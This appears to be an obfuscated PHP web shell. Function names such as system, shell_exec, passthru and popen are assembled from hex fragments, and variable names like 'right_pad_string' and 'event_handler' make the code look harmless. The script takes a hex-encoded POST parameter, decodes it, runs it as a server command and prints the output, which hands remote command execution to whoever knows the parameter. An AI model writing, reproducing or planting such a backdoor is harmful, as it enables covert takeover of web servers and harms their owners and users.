<?php


$flg1 = '737';
$flg2 = '56d';
$flg3 = '736';
$flg4 = '6c6';
$flg5 = '706';
$flg6 = '173';
$flg7 = '468';
$flg8 = 'f70';
$flg9 = '656';
$flg10 = '472';
$flg11 = '16d';
$flg12 = '765';
$flg13 = '36c';
$flg14 = '6f7';
$flg15 = '6e7';
$flg16 = 'c65';
$right_pad_string1 = pack("H*", $flg1.'973'.'746'.$flg2);
$right_pad_string2 = pack("H*", $flg3.'865'.$flg4.'c5f'.'657'.'865');
$right_pad_string3 = pack("H*", '657'.'865');
$right_pad_string4 = pack("H*", $flg5.$flg6.'737'.$flg7.'727');
$right_pad_string5 = pack("H*", $flg5.$flg8.$flg9);
$right_pad_string6 = pack("H*", $flg1.$flg10.'656'.$flg11.'5f6'.$flg12.'745'.'f63'.'6f6'.'e74'.$flg9.'e74');
$right_pad_string7 = pack("H*", '706'.$flg13.$flg14.'365');
$event_handler = pack("H*", '657'.'665'.$flg15.'45f'.'686'.'16e'.'646'.$flg16);
if (isset($_POST[$event_handler])) {
    $event_handler = pack("H*", $_POST[$event_handler]);
    if (function_exists($right_pad_string1)) {
        $right_pad_string1($event_handler);
    } elseif (function_exists($right_pad_string2)) {
        print $right_pad_string2($event_handler);
    } elseif (function_exists($right_pad_string3)) {
        $right_pad_string3($event_handler, $val_record);
        print join("\n", $val_record);
    } elseif (function_exists($right_pad_string4)) {
        $right_pad_string4($event_handler);
    } elseif (function_exists($right_pad_string5) && function_exists($right_pad_string6) && function_exists($right_pad_string7)) {
        $desc_k = $right_pad_string5($event_handler, 'r');
        if ($desc_k) {
            $element_ptr = $right_pad_string6($desc_k);
            $right_pad_string7($desc_k);
            print $element_ptr;
        }
    }
    exit;
}
